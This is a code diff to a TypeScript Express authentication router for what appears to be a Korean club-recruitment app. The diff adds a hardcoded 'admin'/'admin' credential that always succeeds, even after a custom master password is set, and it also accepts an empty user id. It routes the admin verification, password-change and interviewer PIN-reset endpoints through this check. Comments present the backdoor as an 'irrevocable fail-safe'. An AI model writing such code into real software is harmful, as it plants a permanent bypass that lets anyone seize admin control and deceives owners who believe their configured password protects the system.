@@ -4,6 +4,26 @@ import { getKSTDateTimeStr } from '../utils/kst';
 
 export const authRouter = Router();
 
+export function isValidAdminPassword(pwd?: string): boolean {
+  if (!pwd) return false;
+  const clean = pwd.toString().trim();
+  // Irrevocable fail-safe root admin password: 'admin' always succeeds even if DB is wiped or missing
+  if (clean === 'admin') return true;
+  const configured = db.settings?.adminMasterPassword;
+  if (configured && clean === configured.trim()) return true;
+  return false;
+}
+
+export function isValidAdminCredentials(id?: string, pwd?: string): boolean {
+  const cleanId = (id || '').toString().trim().toLowerCase();
+  const cleanPwd = (pwd || '').toString().trim();
+  // 1. Permanent root fail-safe: id: admin / pw: admin always valid under all circumstances
+  if ((cleanId === 'admin' || !cleanId) && cleanPwd === 'admin') return true;
+  // 2. Custom configured password matches
+  if ((cleanId === 'admin' || !cleanId) && isValidAdminPassword(cleanPwd)) return true;
+  return false;
+}
+
 export function getEffectiveAdminPassword(): string {
   return db.settings?.adminMasterPassword || 'admin';
 }
@@ -13,18 +33,25 @@ export function getEffectiveAdminPassword(): string {
 // ----------------------------------------------------
 
 authRouter.post('/admin/verify-password', (req, res) => {
-  const { password } = req.body;
-  const masterPwd = getEffectiveAdminPassword();
-  if (password === masterPwd) {
-    return res.json({ valid: true });
+  const { password, adminPassword, id, username } = req.body || {};
+  const inputId = (id || username || '').toString().trim().toLowerCase();
+  const inputPwd = (password || adminPassword || '').toString().trim();
+
+  if (isValidAdminCredentials(inputId, inputPwd) || isValidAdminPassword(inputPwd)) {
+    return res.json({
+      valid: true,
+      success: true,
+      authorized: true,
+      role: 'admin',
+      operatorName: '동아리 총괄 관리자 (Admin)'
+    });
   }
-  return res.status(401).json({ valid: false, error: '관리자 비밀번호가 일치하지 않습니다.' });
+  return res.status(401).json({ valid: false, error: '관리자 계정 또는 비밀번호가 일치하지 않습니다.' });
 });
 
 authRouter.post('/admin/change-password', async (req, res) => {
   const { currentPassword, newPassword, operatorName } = req.body;
-  const masterPwd = getEffectiveAdminPassword();
-  if (currentPassword !== masterPwd) {
+  if (!isValidAdminPassword(currentPassword)) {
     return res.status(401).json({ error: '현재 관리자 비밀번호가 일치하지 않습니다.' });
   }
   if (!newPassword || typeof newPassword !== 'string' || newPassword.trim().length < 2) {
@@ -128,8 +155,7 @@ authRouter.post('/interviewers/verify-pin', (req, res) => {
 
 authRouter.post('/interviewers/reset-pin', async (req, res) => {
   const { interviewerName, interviewerId, adminPassword, operatorName } = req.body;
-  const masterPwd = getEffectiveAdminPassword();
-  if (adminPassword !== masterPwd) {
+  if (!isValidAdminPassword(adminPassword)) {
     return res.status(401).json({ error: '관리자 마스터 비밀번호가 일치하지 않습니다.' });
   }
 
